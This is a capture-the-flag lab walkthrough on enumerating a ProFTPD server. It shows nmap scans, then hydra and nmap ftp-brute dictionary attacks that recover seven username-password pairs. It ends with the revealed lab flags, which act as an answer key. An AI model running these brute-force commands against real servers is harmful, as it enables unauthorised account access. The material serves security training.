# FTP Enum

**`FTP`** (**F**ile **T**ransfer **P**rotocol) - a *client-server* protocol used to transfer files between a network using TCP/UDP connections.

It requires a command channel and a data channel.

Default FTP port is `21`, opened when FTP is activated for sharing data.

```bash
sudo nmap -p21 -sV -sC -O <TARGET_IP>
```

## Lab 1

>  🔬 [ProFTP Recon: Basics](https://attackdefense.pentesteracademy.com/challengedetails?cid=518)
>
>  - Target IP: `192.217.238.3`
>  - Enumeration of [ProFTP](http://www.proftpd.org/) server

```bash
ip -br -c a
```

```bash
eth1@if170718    UP             192.217.238.2/24
```

- Target IP is `192.217.238.3`

```bash
nmap 192.217.238.3
```

```bash
21/tcp open  ftp
```

```bash
nmap -p21 -sV -O 192.217.238.3
```

```bash
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:D9:EE:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Synology DiskStation Manager 5.2-5644 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Unix
```

![nmap -p21](.gitbook/assets/image-20230215114930223.png)

> 📌 FTP server version `ProFTPD 1.3.5a`.

### [ftp](https://linux.die.net/man/1/ftp)

- Try `anonymous:anonymous` login

```bash
ftp 192.217.238.3
# anonymous login failed
```

- Use `hydra` with some users/passwords word lists to check if any credentials work with the ftp server 

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/da
ta/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp
```

```bash
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.217.238.3:21/
[21][ftp] host: 192.217.238.3   login: sysadmin   password: 654321
[21][ftp] host: 192.217.238.3   login: rooty   password: qwerty
[21][ftp] host: 192.217.238.3   login: demo   password: butterfly
[21][ftp] host: 192.217.238.3   login: auditor   password: chocolate
[21][ftp] host: 192.217.238.3   login: anon   password: purple
[21][ftp] host: 192.217.238.3   login: administrator   password: tweety
[21][ftp] host: 192.217.238.3   login: diag   password: tigger
1 of 1 target successfully completed, 7 valid passwords found
```

![hydra user:password attack](.gitbook/assets/image-20230215115946164.png)

> 📌 Found credentials are:
>
> `sysadmin:654321`
> `rooty:qwerty`
> `demo:butterfly`
> `auditor:chocolate`
> `anon:purple`
> `administrator:tweety`
> `diag:tigger`

- Use [nmap ftp-brute script](https://nmap.org/nsedoc/scripts/ftp-brute.html) to find the `sysadmin`'s password

```bash
echo "sysadmin" > users
```

```bash
nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3
```

```bash
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     sysadmin:654321 - Valid credentials
|_  Statistics: Performed 23 guesses in 6 seconds, average tps: 3.8
```

- Extract the 7 flags hidden on the server by logging in to the `ftp` server with each found user

```bash
ftp 192.217.238.3
```

```
ftp> ls
ftp> get secret.txt
ftp> exit

root@attackdefense:~# cat secret.txt 
```

<details>
<summary>Reveal Flag - sysadmin flag is is: 🚩</summary>

`260ca9dd8a4577fc00b7bd5810298076`

</details>

<details>
<summary>Reveal Flag - rooty flag is is: 🚩</summary>

`e529a9cea4a728eb9c5828b13b22844c`

</details>

<details>
<summary>Reveal Flag - demo flag is is: 🚩</summary>

`d6a6bc0db10694a2d90e3a69648f3a03`

</details>

<details>
<summary>Reveal Flag - auditor flag is is: 🚩</summary>

`098f6bcd4621d373cade4e832627b4f6`

</details>

<details>
<summary>Reveal Flag - anon flag is is: 🚩</summary>

`1bc29b36f623ba82aaf6724fd3b16718`

</details>

<details>
<summary>Reveal Flag - administrator flag is is: 🚩</summary>

`21232f297a57a5a743894a0e4a801fc3`

</details>

<details>
<summary>Reveal Flag - diag flag is is: 🚩</summary>

`12a032ce9179c32a6c7ab397b9d871fa`

</details>

